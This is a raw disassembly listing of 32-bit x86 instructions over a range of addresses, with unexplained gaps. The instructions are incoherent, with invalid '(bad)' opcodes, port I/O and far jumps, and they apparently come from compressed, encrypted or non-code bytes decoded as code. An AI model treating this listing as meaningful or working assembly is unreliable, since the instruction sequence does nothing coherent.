  41fb04:	sub    eax,DWORD PTR [ecx-0x71]
  41fb07:	inc    edx
  41fb08:	mov    ah,0x8a
  41fb0a:	sbb    BYTE PTR [eax],bh
  41fb0c:	popa   
  41fb0d:	xor    eax,0x99a6d0d
  41fb12:	test   BYTE PTR [ebx],al
  41fb14:	mov    ds:0x7dd30dea,eax
  41fb19:	xchg   BYTE PTR [eax-0x73],bh
  41fb1c:	scas   eax,DWORD PTR es:[edi]
  41fb1d:	repz dec ebx
  41fb1f:	addr16 out dx,al
  41fb21:	ss sub eax,0x87f84347
  41fb27:	(bad)  
  41fb28:	cmp    cl,al
  41fb2a:	pop    edi
  41fb2b:	and    DWORD PTR [edi+eiz*8-0x38dcbb75],esi
  41fb32:	push   edx
  41fb33:	add    bl,BYTE PTR ds:0xe29245aa
  41fb39:	jmp    DWORD PTR [ebx+0xf]
  41fb3c:	jmp    0x41fba8
  41fb3e:	sub    BYTE PTR [esi],0x10
  41fb41:	mov    ch,al
  41fb43:	push   ss
  41fb44:	and    BYTE PTR [esi-0x8],ah
  41fb47:	xor    DWORD PTR [ebp-0x4c2662c8],esp
  41fb4d:	lods   eax,DWORD PTR ds:[esi]
  41fb4e:	xor    DWORD PTR [ebx-0x77c59bd2],ecx
  41fb54:	inc    ecx
  41fb55:	int3   
  41fb56:	mov    bl,0xb2
  41fb58:	jg     0x41fb23
  41fb5a:	stc    
  41fb5b:	scas   al,BYTE PTR es:[edi]
  41fb5c:	cdq    
  41fb5d:	xor    esi,DWORD PTR [ebp-0x1fd12ff8]
  41fb63:	and    al,0x1b
  41fb65:	or     ebp,ebp
  41fb67:	in     al,dx
  41fb68:	mov    cl,0x95
  41fb6a:	adc    eax,0xc16cf808
  41fb6f:	lahf   
  41fb70:	(bad)  
  41fb71:	push   ebp
  41fb72:	cmp    al,0xbf
  41fb74:	push   esi
  41fb75:	pop    edi
  41fb76:	push   0x3dcb31c9
  41fb7b:	adc    ch,dh
  41fb7d:	in     al,0x85
  41fb7f:	mov    ds:0x75593d87,eax
  41fb84:	lahf   
  41fb85:	enter  0xc727,0x7e
  41fb89:	icebp  
  41fb8a:	rcl    esp,cl
  41fb8c:	cmp    DWORD PTR [ebx-0x2e],0xb068
	...
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	push   eax
  41fc01:	pop    esi
  41fc02:	adc    edi,ebx
  41fc04:	push   edx
  41fc05:	push   edx
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    eax,0x6a000001
  41fc0d:	aas    
  41fc0e:	xchg   esp,eax
  41fc0f:	xor    eax,0x57180fc2
  41fc14:	mov    al,BYTE PTR [esi*1+0x4ef20b76]
  41fc1b:	xchg   esi,eax
  41fc1c:	jae    0x41fc37
  41fc1e:	adc    BYTE PTR [ebx-0xd0a32a6],dl
  41fc24:	lods   al,BYTE PTR ds:[esi]
  41fc25:	sar    BYTE PTR [ebx+0x5c],0x0
  41fc29:	fist   WORD PTR [eax-0x65ea635b]
  41fc2f:	mov    ah,0xd4
  41fc31:	pop    ds
  41fc32:	add    esi,DWORD PTR [esi+0x6597533]
  41fc38:	mov    dh,0xd7
  41fc3a:	outs   dx,DWORD PTR ds:[esi]
  41fc3b:	xchg   ebx,eax
  41fc3c:	repz mov dh,BYTE PTR [ecx-0x6a863782]
  41fc43:	les    ebx,FWORD PTR [eax+0x5b]
  41fc46:	(bad)  
  41fc47:	mov    ah,0x50
  41fc49:	mov    esp,0x3b3a23cc
  41fc4e:	jle    0x41fbea
  41fc50:	push   0xfffffff3
  41fc52:	adc    BYTE PTR [eax+0x73],cl
  41fc55:	mov    eax,ds:0xad646bdd
  41fc5a:	xor    cl,dl
  41fc5c:	jle    0x41fc8f
  41fc5e:	inc    ebp
  41fc5f:	mov    bh,0x9d
  41fc61:	add    dh,dh
  41fc63:	sub    cl,BYTE PTR [ebx+0x6087065a]
  41fc69:	xchg   ebp,ebx
  41fc6b:	inc    esi
  41fc6c:	loopne 0x41fccb
  41fc6e:	jmp    0x22b2:0x914ffa8b
  41fc75:	jmp    0x41fcc2
  41fc77:	jl     0x41fc61
  41fc79:	mov    ds:0xb574d159,eax
  41fc7e:	jns    0x41fc13
  41fc80:	mov    al,0xc0
  41fc82:	pop    eax
  41fc83:	cmc    
  41fc84:	dec    ebp
  41fc85:	outs   dx,BYTE PTR ds:[esi]
  41fc86:	and    dh,dh
  41fc88:	mov    eax,ds:0x5ba1695
  41fc8d:	in     eax,dx
  41fc8e:	call   0xd04ce129
  41fc93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc94:	aad    0xad
  41fc96:	add    DWORD PTR [edi+0x56],esp
  41fc99:	jp     0x41fc22
  41fc9b:	fdivr  DWORD PTR [edx-0x5fd2650]
  41fca1:	xchg   DWORD PTR [eax-0x213818b4],ebx
  41fca7:	aaa    
  41fca8:	pop    ss
  41fca9:	push   ebx
  41fcaa:	xor    eax,0x867b57a6
  41fcaf:	jmp    0x7412808a
  41fcb4:	adc    eax,0x95defce8
  41fcb9:	lds    esp,FWORD PTR [ebx-0x376d57a3]
  41fcbf:	ja     0x41fd10
  41fcc1:	mov    ecx,0xec96e9a9
  41fcc6:	add    esp,DWORD PTR [esi+0x2d]
  41fcc9:	adc    ecx,DWORD PTR ds:0x82ac2e4a
  41fccf:	outs   dx,DWORD PTR ds:[esi]
  41fcd0:	jg     0x41fd03
  41fcd2:	jnp    0x41fc64
  41fcd4:	bound  ebp,QWORD PTR [ebx+0x7]
  41fcd7:	arpl   WORD PTR [eax+ecx*4-0x74],si
  41fcdb:	nop
  41fcdc:	sub    BYTE PTR [eax+0x6],0xb6
  41fce0:	popf   
  41fce1:	sbb    edx,ecx
  41fce3:	fld    TBYTE PTR [ebp+0x14c9c136]
  41fce9:	in     eax,0x4f
  41fceb:	pop    ebx
  41fcec:	cli    
  41fced:	mov    es,ebp
  41fcef:	sbb    cl,bl
  41fcf1:	retf   0x1aaa
  41fcf4:	stc    
  41fcf5:	cli    
  41fcf6:	adc    al,0xde
  41fcf8:	push   edi
  41fcf9:	add    cl,BYTE PTR [esp+ebp*2]
  41fcfc:	push   edi
  41fcfd:	xchg   esi,eax
  41fcfe:	sar    esi,0xc6
  41fd01:	adc    DWORD PTR [esi-0x1a],eax
  41fd04:	repz mov eax,0xe7145cbc
  41fd0a:	pop    edx
  41fd0b:	pop    es
  41fd0c:	xchg   esp,eax
  41fd0d:	inc    edx
  41fd0e:	xor    BYTE PTR [edx+0x5d],ch
	...
  41fd71:	add    BYTE PTR [eax],al
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	sub    BYTE PTR [ecx+0x66],0xa3
  41fd84:	push   edi
  41fd85:	push   ebx
  41fd86:	add    DWORD PTR [eax],eax
  41fd88:	add    eax,0xa4000001
  41fd8d:	ins    BYTE PTR es:[edi],dx
  41fd8e:	fnstenv ds:0x6529fb66
  41fd94:	mov    WORD PTR [edx],gs
  41fd96:	test   eax,0x1f720925
  41fd9b:	loope  0x41fd21
  41fd9d:	pusha  
  41fd9e:	push   ds
  41fd9f:	sbb    ebp,DWORD PTR ds:0x4b0eafdf
  41fda5:	and    eax,0x75bc852f
  41fdaa:	int3   
  41fdab:	in     eax,0x96
  41fdad:	fnstenv [ebx]
  41fdaf:	gs mov bl,0xc9
  41fdb2:	shr    BYTE PTR [ebx-0x48b24d],cl
  41fdb8:	jl     0x41fd7f
  41fdba:	fwait
  41fdbb:	xchg   edi,eax
  41fdbc:	add    al,0xb3
  41fdbe:	or     dh,cl
  41fdc0:	shl    bh,1
  41fdc2:	jmp    0xa41b9a85
  41fdc7:	test   DWORD PTR [ebx-0x16c6652c],esp
  41fdcd:	or     eax,0xaf2866f6
  41fdd2:	dec    esp
  41fdd3:	int    0xd5
  41fdd5:	gs jl  0x41fdc6
  41fdd8:	(bad)  
  41fdda:	das    
  41fddb:	cmp    ecx,DWORD PTR [esi-0x7e9ba7c6]
  41fde1:	pop    edx
  41fde2:	iret   
  41fde3:	and    BYTE PTR [edi-0x20],0xed
  41fde7:	test   al,0xbe
  41fde9:	out    0xcc,eax
  41fdeb:	sub    DWORD PTR [ebx-0x31],ebx
  41fdee:	(bad)  
  41fdef:	mov    dl,0x53
  41fdf1:	mov    ds:0x7f1621e1,al
  41fdf6:	test   BYTE PTR [ebx-0x42273aeb],ch
  41fdfc:	adc    eax,DWORD PTR [esi]
  41fdfe:	fwait
  41fdff:	dec    esi
  41fe00:	inc    eax
  41fe01:	or     al,0x24
  41fe03:	sub    al,0x7f
  41fe05:	inc    esp
  41fe06:	xchg   edi,eax
  41fe07:	call   0xbe9f:0x1790d9
  41fe0e:	stc    
  41fe0f:	stc    
  41fe10:	cmc    
  41fe11:	jle    0x41fd93
  41fe13:	mov    edx,0xdc5bf347
  41fe18:	mov    edx,0xe0b37aff
  41fe1d:	aad    0xaf
  41fe1f:	push   ebp
  41fe20:	rol    DWORD PTR [ecx-0x17],0xb8
  41fe24:	xchg   ecx,eax
  41fe25:	aaa    
  41fe26:	or     edi,DWORD PTR [ebx+0x57ec3d6f]
  41fe2c:	mov    eax,ds:0xe0124ae8
  41fe31:	cwde   
  41fe32:	jmp    0x41fe25
  41fe34:	inc    ebp
  41fe35:	mov    dl,0xd3
  41fe37:	scas   al,BYTE PTR es:[edi]
  41fe38:	inc    ebp
  41fe39:	jae    0x41fe9d
  41fe3b:	lds    esp,FWORD PTR [ebx-0x63]
  41fe3e:	ss stos BYTE PTR es:[edi],al
  41fe40:	jg     0x41fe6e
  41fe42:	pop    ebx
  41fe43:	ins    DWORD PTR es:[edi],dx
  41fe44:	cmp    dh,dl
  41fe46:	and    BYTE PTR [ebx-0x615bae2c],0xf7
  41fe4d:	sub    DWORD PTR [ebx+0x7bd1d1bd],eax
  41fe53:	jns    0x41fe73
  41fe55:	push   ebp
  41fe56:	hlt    
  41fe57:	mov    eax,0xdf21ae09
  41fe5c:	cmp    esp,edx
  41fe5e:	mov    ebp,0x543083b5
  41fe63:	mov    al,0xc9
  41fe65:	and    BYTE PTR [edx-0x4a],dl
  41fe68:	adc    ebx,DWORD PTR [edx+eiz*4-0xc141b77]
  41fe6f:	sbb    eax,0x556405ac
  41fe74:	outs   dx,DWORD PTR ds:[esi]
  41fe75:	cmp    esp,DWORD PTR [esi-0x34af5e89]
  41fe7b:	xor    ebx,DWORD PTR [esi+edx*2-0x1d]
  41fe7f:	adc    cl,dh
  41fe81:	and    ah,al
  41fe83:	xchg   ebp,eax
  41fe84:	xchg   esi,eax
  41fe85:	(bad)  
  41fe86:	ins    DWORD PTR es:[edi],dx
  41fe87:	and    eax,0xb4ef3feb
  41fe8c:	std    
  41fe8d:	fcomp  DWORD PTR [eax]
  41fe8f:	(bad)  
  41fe90:	pop    ebp
	...
  41fef1:	add    BYTE PTR [eax],al
  41fef3:	add    BYTE PTR [edx-0x1865ab],ch
  41fef9:	out    dx,eax
  41fefa:	call   FWORD PTR [ebp-0x5]
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0xf8
  41ff01:	cmp    dl,al
  41ff03:	stos   BYTE PTR es:[edi],al
  41ff04:	pop    esp
  41ff05:	push   esp
  41ff06:	add    DWORD PTR [eax],eax
  41ff08:	add    eax,0xd0000001
  41ff0d:	xlat   BYTE PTR ds:[ebx]
  41ff0e:	loop   0x41fea2
  41ff10:	data16 and BYTE PTR [edx+0x1a],bh
  41ff14:	pop    eax
  41ff15:	cwde   
  41ff16:	pop    edx
  41ff17:	mov    ch,0x4d
  41ff19:	jg     0x41ff15
  41ff1b:	arpl   WORD PTR [ebx],cx
  41ff1d:	pop    ds
  41ff1e:	sahf   
  41ff1f:	gs stos DWORD PTR es:[edi],eax
  41ff21:	jb     0x41ff35
  41ff23:	repz pushf 
  41ff25:	or     BYTE PTR [esi+0xd63a78e],0x25
  41ff2c:	add    ebx,DWORD PTR [edx-0x578105b1]
  41ff32:	dec    eax
  41ff33:	xchg   esi,eax
  41ff34:	ror    BYTE PTR [edx+ebx*2-0x54cddfca],cl
  41ff3b:	jne    0x41fedb
  41ff3d:	dec    eax
  41ff3e:	out    dx,eax
  41ff3f:	test   ecx,edi
  41ff41:	repz sub DWORD PTR [edx+0x2e],ebx
  41ff45:	push   ss
  41ff46:	scas   al,BYTE PTR es:[edi]
  41ff47:	mov    ebx,ebp
  41ff49:	cmc    
  41ff4a:	(bad)  
  41ff4c:	icebp  
  41ff4d:	fwait
  41ff4e:	retf   
  41ff4f:	scas   eax,DWORD PTR es:[edi]
  41ff50:	jb     0x41ff09
  41ff52:	cmp    bl,BYTE PTR [edx+0x55]
  41ff55:	inc    ebx
  41ff56:	sbb    eax,edx
  41ff58:	ins    DWORD PTR es:[edi],dx
  41ff59:	bound  ebx,QWORD PTR [esi+0xd]
  41ff5c:	out    0x1d,eax
  41ff5e:	rcl    esp,cl
  41ff60:	in     al,dx
  41ff61:	lods   eax,DWORD PTR ds:[esi]
  41ff62:	ins    BYTE PTR es:[edi],dx
  41ff63:	dec    edx
  41ff64:	mov    ch,0xb9
  41ff66:	adc    DWORD PTR [eax-0x1edcb30b],ecx
  41ff6c:	dec    ebp
  41ff6d:	in     al,dx
  41ff6e:	sbb    DWORD PTR [edi],ecx
  41ff70:	cdq    
  41ff71:	mov    ds:0xc59502d1,eax
  41ff76:	(bad)  
  41ff77:	adc    eax,0xb4648b54
  41ff7c:	into   
  41ff7d:	sahf   
  41ff7e:	daa    
  41ff7f:	jecxz  0x41ff6d
  41ff81:	dec    edi
  41ff82:	cmc    
  41ff83:	mov    eax,ds:0x3e0af708
  41ff88:	adc    ch,0xab
  41ff8b:	dec    esp
  41ff8c:	clc    
  41ff8d:	jmp    0x1edb:0xa5e240bd
  41ff94:	daa    
  41ff95:	rcr    BYTE PTR [ecx+ebx*4+0x2f027e71],cl
  41ff9c:	sub    DWORD PTR [edx+0x5a],esp
  41ff9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffa0:	or     BYTE PTR [ecx-0x24605681],ah
  41ffa6:	popa   
  41ffa7:	push   0x3d
  41ffa9:	xchg   ecx,eax
  41ffaa:	fisubr WORD PTR [ebx]
  41ffac:	dec    ebx
  41ffad:	aam    0x39
  41ffaf:	sti    
  41ffb0:	jbe    0x41ff8d
  41ffb2:	enter  0x75cc,0x5a
  41ffb6:	clc    
  41ffb7:	shl    ah,0x26
  41ffba:	push   es
  41ffbb:	and    dh,0x8f
  41ffbe:	or     eax,DWORD PTR [ebp-0x432030d3]
  41ffc4:	pop    esp
  41ffc5:	pop    edi
  41ffc6:	dec    esp
  41ffc7:	cld    
  41ffc8:	push   edi
  41ffc9:	imul   ebx,ebx,0xc
  41ffcc:	adc    bh,al
  41ffce:	aaa    
  41ffcf:	aad    0x58
  41ffd1:	sbb    al,cl
  41ffd3:	adc    bh,0x19
  41ffd6:	dec    esp
  41ffd7:	xor    bl,BYTE PTR [edx]
  41ffd9:	and    DWORD PTR [edi+0x62],esp
  41ffdc:	aaa    
  41ffdd:	cmp    BYTE PTR [eax],cl
  41ffdf:	push   edi
  41ffe0:	pushf  
  41ffe1:	push   ss
  41ffe2:	or     esi,DWORD PTR [edx-0x2]
  41ffe5:	pop    ds
  41ffe6:	jmp    0x5aa8:0xe0e04023
  41ffed:	leave  
  41ffee:	mov    dh,0x32
  41fff0:	jl     0x42005e
  41fff2:	iret   
  41fff3:	jbe    0x55df6050
  41fff9:	daa    
  41fffa:	or     al,0x18
  41fffc:	std    
  41fffd:	out    0xf4,al
  41ffff:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  420001:	pop    ecx
  420002:	jbe    0x41fff3
  420004:	ror    esi,cl
  420006:	jmp    FWORD PTR [esp+eax*8-0x2e5e4d33]
  42000d:	mov    fs,WORD PTR [edx]
  42000f:	lahf   
  420010:	test   al,0x0
	...
  420072:	add    BYTE PTR [eax],al
  420074:	bound  esp,QWORD PTR [ebp-0x8808a]
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xfffffff3
  420081:	push   ebx
  420082:	rcr    dl,0x61
  420085:	push   ebp
  420086:	add    DWORD PTR [eax],eax
  420088:	add    eax,0x5000001
  42008d:	nop
  42008e:	mov    DWORD PTR [ebp+0xf145492],ebx
  420094:	(bad)  
  420095:	retf   
  420096:	out    dx,al
  420097:	xchg   ebp,eax
  420098:	push   0xffffff90
  42009a:	mov    bl,ch
  42009c:	xchg   esi,eax
  42009d:	jb     0x4200bc
  42009f:	mov    ds:0xf7ba1410,al
  4200a4:	xor    DWORD PTR [edi+eax*2],ecx
  4200a7:	push   edx
  4200a8:	or     eax,0xfe405fd3
  4200ad:	fs in  eax,0xa3
  4200b0:	stos   BYTE PTR es:[edi],al
  4200b1:	inc    ebx
  4200b2:	sbb    eax,0x972302a9
  4200b7:	arpl   WORD PTR [ebx+0x2d],bp
  4200ba:	(bad)  
  4200bb:	mov    ds:0xfc4771d6,eax
  4200c0:	aad    0xc8
  4200c2:	or     BYTE PTR [ebp+0x50],bl
  4200c5:	xchg   esi,eax
  4200c6:	and    BYTE PTR [esi],al
  4200c8:	lods   eax,DWORD PTR ds:[esi]
  4200c9:	(bad)  
  4200ca:	nop
  4200cb:	iret   
  4200cc:	push   0x2e782aeb
  4200d1:	xor    DWORD PTR ds:0x569bd400,eax
  4200d7:	mov    WORD PTR [ebx+ebp*8+0x57],?
  4200db:	mov    cl,0x46
  4200dd:	cmp    DWORD PTR [edx-0x22],ebx
  4200e0:	inc    edx
  4200e1:	scas   al,BYTE PTR es:[edi]
  4200e2:	jns    0x4200c0
  4200e4:	rcl    BYTE PTR [esi+0x1e07dd85],1
  4200ea:	add    dl,dl
  4200ec:	shl    DWORD PTR [eax+0x69a5cc8a],0x87
  4200f3:	push   ecx
  4200f4:	nop
  4200f5:	aaa    
  4200f6:	cmp    DWORD PTR [ebx+0x12],0x61
  4200fa:	mov    edx,0xa9f87d7
  4200ff:	jnp    0x42015d
  420101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420102:	dec    eax
  420103:	(bad)  
  420104:	sahf   
  420105:	sahf   
  420106:	stos   BYTE PTR es:[edi],al
  420107:	lods   al,BYTE PTR ds:[esi]
  420108:	fwait
  420109:	bound  edi,QWORD PTR [ebx+0x6d]
  42010c:	dec    edx
  42010d:	out    0x58,eax
  42010f:	cmp    eax,0x43c7ef02
  420114:	pop    edi
  420115:	rcr    BYTE PTR [edx],0x5d
  420118:	repnz out 0xc8,al
  42011b:	scas   eax,DWORD PTR es:[edi]
  42011c:	sub    BYTE PTR [ebp-0x1f],ah
  42011f:	sbb    esi,DWORD PTR [esi+0x6b911b3c]
  420125:	in     eax,dx
  420126:	mov    ah,cl
  420128:	neg    DWORD PTR [ebp+0x0]
  42012b:	pop    ebp
  42012c:	enter  0xd452,0x73
  420130:	loop   0x4200b7
  420132:	fbld   TBYTE PTR [edx+0x47609117]
  420138:	mov    ch,0xca
  42013a:	mov    bl,0x93
  42013c:	sbb    eax,0xff519b2e
  420141:	loopne 0x420189
  420143:	cmp    eax,0x10a53d80
  420148:	fistp  WORD PTR [ecx]
  42014a:	lea    ebx,[edx+0x6e6e7b1e]
  420150:	adc    bh,BYTE PTR [esi-0x12]
  420153:	rcl    DWORD PTR [edi+0x56],0x18
  420157:	hlt    
  420158:	adc    esi,DWORD PTR [edi+0x10]
  42015b:	or     al,BYTE PTR gs:[ebx-0x1b]
  42015f:	es retf 0xcad9
  420163:	jb     0x4201da
  420165:	aas    
  420166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420167:	dec    BYTE PTR [ecx]
  420169:	push   ds
  42016a:	ins    DWORD PTR es:[edi],dx
  42016b:	jecxz  0x4201c1
  42016d:	outs   dx,BYTE PTR ds:[esi]
  42016e:	call   0xaa4beab1
  420173:	and    ecx,esp
  420175:	pop    ebp
  420176:	je     0x4201bc
  420178:	inc    edx
  420179:	es (bad) 
  42017b:	and    al,0x7
  42017d:	pop    ebp
  42017e:	mov    dl,0x4a
  420180:	loop   0x42017e
  420182:	jg     0x420143
  420184:	mov    DWORD PTR [eax],eax
  420186:	loop   0x420154
  420188:	push   0xc34f31de
  42018d:	int3   
  42018e:	ja     0x420185
  420190:	rol    DWORD PTR [eax],0x0
	...
  4201f3:	add    BYTE PTR [ebx-0x31],dh
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx+0x39fd6f5b],1
  420204:	push   si
  420206:	add    DWORD PTR [eax],eax
  420208:	add    eax,0x3d000001
  42020d:	mov    WORD PTR [ecx],?
  42020f:	mov    DWORD PTR [edi+eax*8-0x42d7340b],edi
  420216:	add    ch,BYTE PTR [edx+0x6da154c3]
  42021c:	jmp    0xb470a9e7
  420221:	fcom   st(4)
  420223:	cld    
  420224:	dec    ecx
  420225:	inc    edx
  420226:	jo     0x4201c9
  420228:	out    0x79,eax
  42022a:	jecxz  0x4201f9
  42022c:	xor    DWORD PTR [edx-0x30ec965e],edi
  420232:	aad    0xeb
  420234:	dec    bx
  420236:	inc    edx
  420237:	mov    al,fs:0xf1bdb784
  42023d:	outs   dx,DWORD PTR ds:[esi]
  42023e:	fimul  DWORD PTR [esi]
  420240:	ror    DWORD PTR [ebp+eax*1+0x5c3b1cb7],0x62
  420248:	(bad)  
  420249:	loope  0x4201ec
  42024b:	addr16 jo 0x4201f0
  42024e:	cld    
  42024f:	xchg   edx,eax
  420250:	xchg   ebp,eax
  420251:	or     eax,DWORD PTR [ecx+eax*8-0x1682e5e5]
  420258:	cmp    esi,ebx
  42025a:	and    eax,0x4da35aa8
  42025f:	inc    dx
  420261:	and    esp,esi
  420263:	addr16 fwait
  420265:	xchg   DWORD PTR [ebp-0x2d0ba5b2],esi
  42026b:	mov    ah,0x50
  42026d:	jg     0x4202e6
  42026f:	ins    BYTE PTR es:[edi],dx
  420270:	xor    BYTE PTR [ecx+0x41],bh
  420273:	popf   
  420274:	add    DWORD PTR ds:0x55526d26,esi
  42027a:	es (bad) 
  42027c:	aam    0xaf
  42027e:	pop    ecx
  42027f:	xchg   ebp,eax
  420280:	cmp    ebp,DWORD PTR [ecx-0x3f6b1464]
  420286:	jnp    0x420239
  420288:	jmp    FWORD PTR [edx]
  42028a:	sub    eax,0xcf907598
  42028f:	mov    ecx,0xb0e30573
  420294:	sbb    DWORD PTR [ebx],0xffffffac
  420297:	mov    edi,0x8c819ca1
  42029c:	mov    eax,0x6db5412d
  4202a1:	mov    bh,0x8b
  4202a3:	(bad)  
  4202a4:	push   ecx
  4202a5:	xor    esp,DWORD PTR [ebx+0x6a]
  4202a8:	fyl2xp1 
  4202aa:	pusha  
  4202ab:	jns    0x4202a6
  4202ad:	xlat   BYTE PTR ds:[ebx]
  4202ae:	sbb    DWORD PTR [ebx-0x31],0xb29e7c9d
  4202b5:	mov    edx,0xb26d368d
  4202ba:	sub    BYTE PTR [esi-0x6e],al
  4202bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202be:	ss ins DWORD PTR es:[edi],dx
  4202c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202c1:	mov    bh,0x6c
  4202c3:	jmp    0xb64e0b18
  4202c8:	mov    ch,0xb4
  4202ca:	sbb    DWORD PTR [eax-0x79a6f322],ebx
  4202d0:	enter  0xd6db,0x69
  4202d4:	add    DWORD PTR [edi-0x2f61434d],ecx
  4202da:	push   edx
  4202db:	ret    0xe14e
  4202de:	jmp    0x370ae7c8
  4202e3:	call   0x377b:0x297181fc
  4202ea:	xchg   edx,eax
  4202eb:	(bad)  
  4202ec:	jle    0x4202f6
  4202ee:	rcr    DWORD PTR [esi],1
  4202f0:	add    esp,DWORD PTR [edx+0x7f]
  4202f3:	int    0x2a
  4202f5:	push   ecx
  4202f6:	xchg   DWORD PTR [esi+0x1e2394cf],edi
  4202fc:	ds leave 
  4202fe:	pushaw 
  420300:	div    DWORD PTR [eax+0x3d4af706]
  420306:	or     DWORD PTR [esi],0xffffff9f
  420309:	bound  ecx,QWORD PTR [ebx+0x55]
  42030c:	pushf  
  42030d:	xchg   ebx,eax
  42030e:	jecxz  0x42038f
  420310:	mov    BYTE PTR [eax],al
	...
  420372:	add    BYTE PTR [eax],al
  420374:	inc    ecx
  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	push   ecx
  420381:	shl    BYTE PTR [edx+ebp*8+0x6b],0x57
  420386:	add    DWORD PTR [eax],eax
  420388:	add    eax,0xa4000001
  42038d:	sbb    bh,bl
  42038f:	loope  0x4203f0
  420391:	xchg   esp,eax
  420392:	push   ss
  420393:	sub    DWORD PTR [esi+0xcc04361],ebp
  420399:	fs push ss
  42039b:	lahf   
  42039c:	or     esp,eax
  42039e:	stos   DWORD PTR es:[edi],eax
  42039f:	je     0x420346
  4203a1:	pusha  
  4203a2:	add    ah,BYTE PTR [ebx+0x6c148832]
  4203a8:	jmp    0x5409:0xa0b9947
  4203af:	mov    dl,0x81
  4203b1:	jno    0x420381
  4203b3:	mov    esi,0xd4d3970b
  4203b8:	jecxz  0x420354
  4203ba:	pushf  
  4203bb:	mov    bh,0xb9
  4203bd:	std    
  4203be:	sub    DWORD PTR [ebp+0x2279b928],ecx
  4203c4:	xor    eax,DWORD PTR [esi]
  4203c6:	lds    edi,FWORD PTR [eax]
  4203c8:	dec    ecx
  4203c9:	cmp    cl,cl
  4203cb:	hlt    
  4203cc:	out    dx,al
  4203cd:	jbe    0x420442
  4203cf:	aam    0xb0
  4203d1:	pop    edi
  4203d2:	dec    edi
  4203d3:	pop    ds
  4203d4:	loopne 0x420356
  4203d6:	pop    ebx
  4203d7:	jne    0x420409
  4203d9:	mov    edi,0x799e427c
  4203de:	bound  esp,QWORD PTR [edi-0x67e9d703]
  4203e4:	xor    BYTE PTR [esi],cl
  4203e6:	dec    edx
  4203e7:	or     BYTE PTR [edi+0x20],0x62
  4203eb:	or     BYTE PTR [edx-0x4b],cl
  4203ee:	push   edi
  4203ef:	mov    gs,WORD PTR [ebx]
  4203f1:	dec    edx
  4203f2:	and    eax,0x98caa107
  4203f7:	mov    dl,0xf9
  4203f9:	test   BYTE PTR [ebx-0xe2615f2],cl
  4203ff:	jecxz  0x4203e1
  420401:	xchg   ebp,eax
  420402:	xchg   esp,eax
  420403:	enter  0x46c6,0x0
  420407:	ror    BYTE PTR [ecx],cl
  420409:	add    DWORD PTR [edx+eax*1+0x21163873],0xf20e7471
  420414:	ret    
  420415:	inc    ecx
  420416:	aaa    
  420417:	mov    ds:0x7814b84e,al
  42041c:	adc    eax,DWORD PTR [ecx+edi*2+0x13e993d]
  420423:	and    eax,DWORD PTR ds:0xc5687b60
  420429:	in     al,dx
  42042a:	retf   
  42042b:	cmovbe esi,esp
  42042e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42042f:	ret    
  420430:	mov    ds:0xa718b480,al
  420435:	adc    al,0x77
  420437:	popf   
  420438:	fdivr  QWORD PTR ds:0xacbd2ba7
  42043e:	into   
  42043f:	or     dl,BYTE PTR [ebp+0x60f30430]
  420445:	pop    edi
  420446:	cli    
  420447:	pop    es
  420448:	int3   
  420449:	sub    BYTE PTR [ebp-0x35],bl
  42044c:	mov    ds:0xbd7607bd,eax
  420451:	ss push ds
  420453:	dec    esp
  420454:	mov    ebp,0xdbfcfba6
  420459:	rcl    BYTE PTR [ecx],1
  42045b:	pop    ds
  42045c:	add    eax,0x232cb8a1
  420461:	push   ss
  420462:	add    eax,0x2c9f9c3a
  420467:	adc    eax,0xb579b11
  42046c:	sti    
  42046d:	cmp    bh,ah
  42046f:	mov    al,0x33
  420471:	add    al,0xed
  420473:	mov    fs,WORD PTR [ecx+0x17ae6b31]
  420479:	jne    0x420459
  42047b:	mov    cl,0x37
  42047d:	inc    eax
  42047e:	sbb    esp,esi
  420480:	xor    BYTE PTR [eax-0x5fefde03],ah
  420486:	pusha  
  420487:	fcom   QWORD PTR [ebx+0x4d64f81]
  42048d:	adc    cl,al
  42048f:	lds    eax,FWORD PTR es:[eax]
	...
  4204f2:	add    BYTE PTR [eax],al
  4204f4:	scas   al,BYTE PTR es:[edi]
  4204f5:	xchg   esp,eax
  4204f6:	push   edi
  4204f7:	adc    bh,BYTE PTR [edi-0x2d]
  4204fa:	out    dx,eax
  4204fb:	mov    esp,0x5a7f6c39
  420500:	pop    ss
  420501:	push   ds
  420502:	xchg   ebx,eax
  420503:	sbb    eax,0x15870
  420508:	add    eax,0x1
  42050d:	pusha  
  42050e:	cmp    eax,0x7810565b
  420513:	popa   
  420514:	mov    ebp,0xe95a65bd
  420519:	mov    cl,0x40
  42051b:	sar    DWORD PTR [ebx-0x789acbe8],cl
  420521:	and    eax,0x3061b74
  420526:	fcomp  QWORD PTR [ecx+edx*1+0x2d8fcd63]
  42052d:	pop    ebp
  42052e:	xchg   ebx,eax
  42052f:	cs stos DWORD PTR es:[edi],eax
  420531:	inc    esi
  420532:	mov    al,ds:0x452ef14d
  420537:	data16 jne 0x420532
  42053a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42053b:	fs pusha 
  42053d:	fwait
  42053e:	hlt    
  42053f:	mov    eax,0x5772786f
